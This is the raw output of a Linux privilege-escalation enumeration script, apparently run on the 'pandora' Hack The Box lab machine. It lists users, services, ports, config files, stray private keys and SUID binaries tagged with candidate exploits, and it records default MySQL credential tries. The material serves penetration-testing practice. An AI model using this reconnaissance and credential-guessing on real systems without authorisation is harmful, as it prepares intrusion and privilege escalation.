╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#d-bus                                                                                     
NAME                            PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                           
:1.0                            534 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
:1.1                            684 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
:1.2                            685 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -
:1.25                          6173 upowerd         root             :1.25         upower.service              -       -
:1.3                            827 systemd-logind  root             :1.3          systemd-logind.service      -       -
:1.4                            829 udisksd         root             :1.4          udisks2.service             -       -
:1.47                         43548 systemd         daniel           :1.47         user@1001.service           -       -
:1.5                            759 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
:1.53                         73206 busctl          matt             :1.53         apache2.service             -       -
:1.6                              1 systemd         root             :1.6          init.scope                  -       -
:1.7                            939 polkitd         root             :1.7          polkit.service              -       -
:1.8                            814 networkd-dispat root             :1.8          networkd-dispatcher.service -       -
com.ubuntu.LanguageSelector       - -               -                (activatable) -                           -       -
com.ubuntu.SoftwareProperties     - -               -                (activatable) -                           -       -
org.freedesktop.Accounts        759 accounts-daemon[0m root             :1.5          accounts-daemon.service     -       -
org.freedesktop.DBus              1 systemd         root             -             init.scope                  -       -
org.freedesktop.PackageKit        - -               -                (activatable) -                           -       -
org.freedesktop.PolicyKit1      939 polkitd         root             :1.7          polkit.service              -       -
org.freedesktop.UDisks2         829 udisksd         root             :1.4          udisks2.service             -       -
org.freedesktop.UPower         6173 upowerd         root             :1.25         upower.service              -       -
org.freedesktop.bolt              - -               -                (activatable) -                           -       -
org.freedesktop.fwupd             - -               -                (activatable) -                           -       -
org.freedesktop.hostname1         - -               -                (activatable) -                           -       -
org.freedesktop.locale1           - -               -                (activatable) -                           -       -
org.freedesktop.login1          827 systemd-logind  root             :1.3          systemd-logind.service      -       -
org.freedesktop.network1        534 systemd-network systemd-network  :1.0          systemd-networkd.service    -       -
org.freedesktop.resolve1        684 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
org.freedesktop.systemd1          1 systemd         root             :1.6          init.scope                  -       -
org.freedesktop.thermald          - -               -                (activatable) -                           -       -
org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
org.freedesktop.timesync1       685 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -


                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                          
                              ╚═════════════════════╝                                                                                                        
╔══════════╣ Hostname, hosts and DNS
pandora                                                                                                                                                      
127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
127.0.1.1 pandora

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0 trust-ad

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                          
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.136  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 fe80::250:56ff:feb9:2f17  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:2f17  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:2f:17  txqueuelen 1000  (Ethernet)
        RX packets 656017  bytes 107275474 (107.2 MB)
        RX errors 0  dropped 2025  overruns 0  frame 0
        TX packets 572378  bytes 389016013 (389.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 436629  bytes 128431162 (128.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 436629  bytes 128431162 (128.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                            
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                           
                                                                                                                                                             


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                          
                               ╚═══════════════════╝                                                                                                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                                                     
uid=1000(matt) gid=1000(matt) groups=1000(matt)                                                                                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                             
                                                                                                                                                             
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
                                                                                                                                                             
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                       
ptrace protection is enabled (1)                                                                                                                             

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                   
                                                                                                                                                             
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                              

╔══════════╣ Users with console
daniel:x:1001:1001::/home/daniel:/bin/bash                                                                                                                   
matt:x:1000:1000:matt:/home/matt:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                       
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1000(matt) gid=1000(matt) groups=1000(matt)
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=113(Debian-snmp) gid=117(Debian-snmp) groups=117(Debian-snmp)
uid=114(mysql) gid=119(mysql) groups=119(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=998(lxd) gid=100(users) groups=100(users)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)

╔══════════╣ Login now
 02:26:40 up 1 day, 12:15,  1 user,  load average: 0.12, 0.07, 0.66                                                                                          
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
daniel   pts/0    10.10.14.4       00:47   14:39   0.05s  0.05s -bash

╔══════════╣ Last logons
daniel   pts/0        Thu Dec 14 14:35:31 2023 - Thu Dec 14 15:10:58 2023  (00:35)     10.10.14.51                                                           
reboot   system boot  Thu Dec 14 14:11:26 2023   still running                         0.0.0.0
root     tty1         Mon Jan  3 08:59:53 2022 - down                      (00:08)     0.0.0.0
reboot   system boot  Mon Jan  3 08:57:28 2022 - Mon Jan  3 09:08:08 2022  (00:10)     0.0.0.0
root     tty1         Mon Jan  3 07:42:50 2022 - down                      (00:16)     0.0.0.0
reboot   system boot  Mon Jan  3 07:39:42 2022 - Mon Jan  3 07:59:19 2022  (00:19)     0.0.0.0
root     tty1         Tue Dec  7 14:57:46 2021 - down                      (00:02)     0.0.0.0
reboot   system boot  Tue Dec  7 14:57:26 2021 - Tue Dec  7 15:00:37 2021  (00:03)     0.0.0.0

wtmp begins Tue Dec  7 14:57:26 2021

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                            
root             tty1                      Mon Jan  3 08:59:53 +0000 2022
daniel           pts/0    10.10.14.4       Sat Dec 16 00:47:56 +0000 2023

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                             
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                             


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                           
                             ╚══════════════════════╝                                                                                                        
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                              
/usr/bin/curl
/usr/bin/nc
/usr/bin/netcat
/usr/bin/nmap
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                                             
╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.3.32-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2                                                                    


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                   
═╣ MySQL connection using root/NOPASS ................. No                                                                                                   
                                                                                                                                                             
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                   
Found readable /etc/mysql/my.cnf
[mysqld]
sql_mode=NO_ENGINE_SUBSTITUTION
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 911 Dec  3  2021 /etc/mysql/mariadb.cnf                                                                                               
[mysqld]
sql_mode=NO_ENGINE_SUBSTITUTION
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 261 Jun 11  2021 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.41 (Ubuntu)                                                                                                       
Server built:   2021-10-14T16:24:43
httpd Not Found
                                                                                                                                                             
Nginx version: nginx Not Found
                                                                                                                                                             
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.4.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.4.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.4.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec  3  2021 /etc/apache2/sites-enabled                                                                                          
drwxr-xr-x 2 root root 4096 Dec  3  2021 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec  3  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 31 Dec  3  2021 /etc/apache2/sites-enabled/pandora.conf -> ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Apr 13  2020 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Dec  3  2021 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 72958 Jun 11  2021 /etc/php/7.4/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72539 Oct  6  2020 /etc/php/7.4/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On



╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Jul 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf                                                                           
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                         
drwxr-xr-x 2 root root 4096 Jun 11  2021 /etc/ldap

drwxr-xr-x 2 root root 4096 Jan  3  2022 /usr/share/php7.4-ldap/ldap

-rw-r--r-- 1 root root 0 Jun 11  2021 /var/lib/php/modules/7.4/apache2/enabled_by_maint/ldap

-rw-r--r-- 1 root root 0 Jun 11  2021 /var/lib/php/modules/7.4/cli/enabled_by_maint/ldap

-rw-r--r-- 1 root root 0 Jan  3  2022 /var/lib/php/modules/7.4/registry/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                  
                                                                                                                                                             




-rw-r--r-- 1 root root 600 Jun 11  2021 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 172 Jun 11  2021 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 Jun 11  2021 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 Jun 11  2021 /etc/ssh/ssh_host_rsa_key.pub
-rw-r--r-- 1 matt matt 272 Jan  3  2020 /var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/dkim/dkim.test.pub

ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes

══╣ Possible private SSH keys were found!
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/dkim/dkim.test.priv
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/intermediate.key
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign2.key
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/ca.key
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt.key
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/encrypt2.key
/var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/tests/_samples/smime/sign.key

══╣ Some certificates were found (out limited):
/etc/pki/fwupd-metadata/LVFS-CA.pem                                                                                                                          
/etc/pki/fwupd/LVFS-CA.pem
/etc/pollinate/entropy.ubuntu.com.pem
/etc/ssl/certs/ACCVRAIZ1.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/CA_Disig_Root_R2.pem
65610PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket                                                                                                  
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                               
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                             


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Dec  7  2021 /etc/pam.d                                                                                                          
-rw-r--r-- 1 root root 2133 Mar  9  2021 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions                                                                       
tmux 3.0a                                                                                                                                                    


/tmp/tmux-1000
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jan  3  2022 /usr/share/keyrings                                                                                                 




╔══════════╣ Analyzing Backup Manager Files (limit 70)
-rw-r--r-- 1 root root 14844 Mar  4  2020 /usr/share/php/DB/storage.php                                                                                      

-rw-r--r-- 1 matt matt 2222 Jan  3  2020 /var/www/pandora/pandora_console/include/help/en/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>
-rw-r--r-- 1 matt matt 2666 Jan  3  2020 /var/www/pandora/pandora_console/include/help/es/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>
-rw-r--r-- 1 matt matt 3159 Jan  3  2020 /var/www/pandora/pandora_console/include/help/ja/help_history_database.php
<i>Mysql Example: GRANT ALL PRIVILEGES ON pandora.* TO 'pandora'@'IP' IDENTIFIED BY 'password'</i>

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                               
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 /var/www/pandora/pandora_console/vendor/mpdf/mpdf/.github                                                           
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 /var/www/pandora/pandora_console/vendor/swiftmailer/swiftmailer/.github




╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                 
netpgpkeys Not Found
netpgp Not Found                                                                                                                                             
                                                                                                                                                             
-rw-r--r-- 1 root root 641 Apr 23  2020 /etc/apt/trusted.gpg.d/microsoft-prod.gpg
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 641 Apr 23  2020 /usr/share/doc/packages-microsoft-prod/microsoft-prod.gpg
-rw-r--r-- 1 root root 3267 Jan  6  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Nov 10  2021 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Jul 16  2021 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jul 13  2021 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jul 13  2021 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jul 16  2021 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2235 Oct  5  2021 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 daniel daniel 4096 Dec 15 04:53 /home/daniel/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)
                                                                                                                                                             
-rw------- 1 daniel daniel 1699 Dec 16 00:33 /home/daniel/.viminfo

╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                      
-rw-r--r-- 1 matt matt 1263 Jan  3  2020 /var/www/pandora/pandora_console/Dockerfile                                                                         


╔══════════╣ Analyzing SNMP Files (limit 70)
-rw------- 1 root root 2960 Jun 16  2021 /etc/snmp/snmpd.conf                                                                                                
-rw------- 1 Debian-snmp Debian-snmp 1074 Dec 14 14:11 /var/lib/snmp/snmpd.conf

╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix                                                                       


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                             


-rw-r--r-- 1 root root 69 Oct  6  2020 /etc/php/7.4/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Nov 25  2021 /usr/share/php7.4-common/common/ftp.ini






╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind                                                                          
-rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                             





















lrwxrwxrwx 1 root root 22 Jun 11  2021 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jun 11  2021 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Dec  7  2021 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc                                                                                                   
-rw-r--r-- 1 daniel daniel 3771 Feb 25  2020 /home/daniel/.bashrc
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 /home/matt/.bashrc





-rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
-rw-r--r-- 1 daniel daniel 807 Feb 25  2020 /home/daniel/.profile
-rw-r--r-- 1 matt matt 807 Feb 25  2020 /home/matt/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                           
                      ╚════════════════════════════════════╝                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
strings Not Found                                                                                                                                            
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                        
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup (Unknown SUID binary!)
-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                             
-rwxr-sr-x 1 root tty 15K Mar 30  2020 /usr/bin/bsd-write                                                                                                    
-rwxr-sr-x 1 root ssh 343K Jul 23  2021 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 83K Jul 14  2021 /usr/bin/chage
-rwxr-sr-x 1 root crontab 43K Feb 13  2020 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 31K Jul 14  2021 /usr/bin/expiry
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root tty 35K Jul 21  2020 /usr/bin/wall
-rwxr-sr-x 1 root utmp 15K Sep 30  2019 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Sep 17  2021 /usr/sbin/unix_chkpwd

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                     
/etc/ld.so.conf                                                                                                                                              
Content of /etc/ld.so.conf:                                                                                                                                  
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                
  - /usr/local/lib                                                                                                                                           
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
